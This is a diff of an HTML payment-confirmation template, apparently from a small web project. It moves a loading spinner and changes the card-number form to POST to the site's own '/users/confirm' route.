@@ -1,4 +1,7 @@
 <link rel="stylesheet" href="/stylesheets/confirm.css">
+<div class="loader-wrapper">
+    <span class="loader"><span class="loader-inner"></span></span>
+</div>
 <div class='container'>
     <div class='window'>
         <div class='order-info'>
@@ -70,7 +73,7 @@
         <img src='https://dl.dropboxusercontent.com/s/ubamyu6mzov5c80/visa_logo%20%281%29.png' height='80' class='credit-card-image' id='credit-card-image'></img>
         
         <div class="form-group"> 
-            <form onsubmit="paid()" action="" name="form">
+            <form method="post" action="/users/confirm" name="form" onsubmit="return paid()">
                 <label for="cc-number" class="control-label">Card number</label> <input name="number" id="cc-number" type="tel" class="input-lg form-control cc-number" autocomplete="cc-number" placeholder="•••• •••• •••• ••••" maxlength=19 required> </div>
                 <span id="error1"></span>
                 <div class="row">
@@ -88,11 +91,8 @@
             </form>
         </div>
     </div>
-    </div>
 </div>
-<div class="loader-wrapper">
-    <span class="loader"><span class="loader-inner"></span></span>
-</div>
+
 <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.bundle.min.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
